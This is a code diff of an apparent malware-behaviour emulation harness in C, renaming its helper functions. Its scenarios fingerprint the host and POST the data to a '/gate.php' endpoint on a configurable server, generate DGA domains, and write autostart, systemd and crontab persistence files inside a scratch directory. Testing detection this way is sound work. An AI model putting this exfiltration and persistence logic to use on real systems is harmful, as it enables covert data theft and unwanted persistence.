@@ -6,7 +6,7 @@
 // Nothing here changes the guest's real configuration: the persistence files
 // are written below the per-run work directory and removed with it, and DGA
 // candidates are printed but never resolved.
-#include "malware.h"
+#include "samples.h"
 
 #include <errno.h>
 #include <fcntl.h>
@@ -104,7 +104,7 @@ SCENARIO(recon)
 {
     const char *name = "recon";
     char fingerprint[640];
-    size_t length = mal_fingerprint(fingerprint, sizeof fingerprint);
+    size_t length = sample_fingerprint(fingerprint, sizeof fingerprint);
     char os[160];
     os_pretty_name(os, sizeof os);
     char body[1024];
@@ -118,13 +118,13 @@ SCENARIO(recon)
         staged = write_text(staged_path, body) == 0;
     }
     unsigned long long received = 0;
-    const char *host = mal_host(options);
-    int port = mal_port(options, MAL_HTTP_PORT);
+    const char *host = sample_host(options);
+    int port = sample_port(options, SAMPLE_HTTP_PORT);
     int delivered =
-        mal_http_request(host, port, "POST", "/gate.php", body, (size_t)body_length, &received) == 0;
+        sample_http_request(host, port, "POST", "/gate.php", body, (size_t)body_length, &received) == 0;
     if (!delivered)
-        mal_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
-    mal_pass(name, "collected %zu bytes (%s), staged %s, exfil POST %s to %s:%d", length, os,
+        sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
+    sample_pass(name, "collected %zu bytes (%s), staged %s, exfil POST %s to %s:%d", length, os,
              staged ? staged_path : "nothing", delivered ? "sent" : "attempted", host, port);
     return 0;
 }
@@ -162,20 +162,20 @@ SCENARIO(dga)
         const char *tld = tlds[xorshift(&state) % (sizeof tlds / sizeof tlds[0])];
         snprintf(domain + at, sizeof domain - at, "%s", tld);
         if (i < 6)
-            mal_note(name, "candidate %s", domain);
+            sample_note(name, "candidate %s", domain);
     }
-    mal_pass(name, "%d deterministic candidates for %04d-%02d-%02d (printed only, not resolved)",
+    sample_pass(name, "%d deterministic candidates for %04d-%02d-%02d (printed only, not resolved)",
              count, broken_down.tm_year + 1900, broken_down.tm_mon + 1, broken_down.tm_mday);
     return 0;
 }
 
-SCENARIO(persist_sim)
+SCENARIO(persistence)
 {
-    const char *name = "persist-sim";
+    const char *name = "persistence";
     if (ensure_dirs(options->workdir, ".config/autostart") != 0 ||
         ensure_dirs(options->workdir, ".config/systemd/user") != 0 ||
         ensure_dirs(options->workdir, ".local/bin") != 0) {
-        mal_fail(name, "work directories: %s", strerror(errno));
+        sample_fail(name, "work directories: %s", strerror(errno));
         return 1;
     }
     char executable[600], desktop[600], service[600], crontab[600];
@@ -229,8 +229,8 @@ SCENARIO(persist_sim)
         if (output >= 0)
             close(output);
     }
-    mal_pass(name, "%d/3 persistence files and %s in %s", written,
+    sample_pass(name, "%d/3 persistence files and %s in %s", written,
              copied ? "a self-copy" : "no self-copy", options->workdir);
-    mal_note(name, "the real ~/.config, systemd user units and crontab are not touched");
+    sample_note(name, "the real ~/.config, systemd user units and crontab are not touched");
     return 0;
 }
